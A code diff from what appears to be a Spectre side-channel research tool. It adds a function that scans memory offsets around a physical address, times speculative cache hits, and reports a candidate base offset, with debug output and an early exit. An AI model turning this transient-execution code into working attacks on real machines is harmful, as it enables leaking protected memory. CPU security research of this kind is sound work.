@@ -8,6 +8,7 @@
 #include <assert.h>
 #include <pthread.h>
 #include "constants.h"
+#include "helpers.h"
 #include "spectre.h"
 #include "timing.h"
 #include "util.h"
@@ -57,6 +58,33 @@ void half_spectre(unsigned char *p, uintptr_t pa_p, uintptr_t pa_base)
 			uint64_t off = pa_p - pa_base + delta_off;
 			printf("half_spectre | pa_base = %lx | p's pa = %lx | offset = %lx | idx = %lx ", pa_base, pa_p+delta_p, off, off/8);
 			printf("| hits = %d / 1M\n", half_spectre_raw(p + delta_p, off/8, 1000000));
+		}
+	}
+}
+
+uintptr_t spectre_find_base(char *p, uintptr_t pa_p)
+{
+	const int verbose = 2;
+#if DEBUG
+	if (verbose >= 1) printf("spectre_find_base:     real base = %10lx\n", helper_base_pa());
+	if (verbose >= 1) printf("spectre_find_base:   correct off = %10lx\n", pa_p-helper_base_pa());
+#endif
+
+	for (int run = 0; run < 1000; run++) {
+		if (verbose >= 2) {
+			printf("l1tf_find_page_pa: run %3d", run);
+			fflush(stdout);
+			printf("\33[2K\r");
+		}
+		// uintptr_t start = 0x1000-0x218; uintptr_t end = pa_p;
+		uintptr_t real_off = pa_p-helper_base_pa(); uintptr_t start = real_off - 1000*PAGE_SIZE; uintptr_t end = real_off + 10*PAGE_SIZE;
+		for (uintptr_t off = start; off < end; off += PAGE_SIZE) {
+			int hits = half_spectre_raw(p, off/8, 10000);
+			if (!hits)
+				continue;
+			printf("spectre_find_base: candidate off = %10lx\n", off);
+			exit(1);
+			half_spectre(p, pa_p, pa_p-off);
 		}
 	}
 }
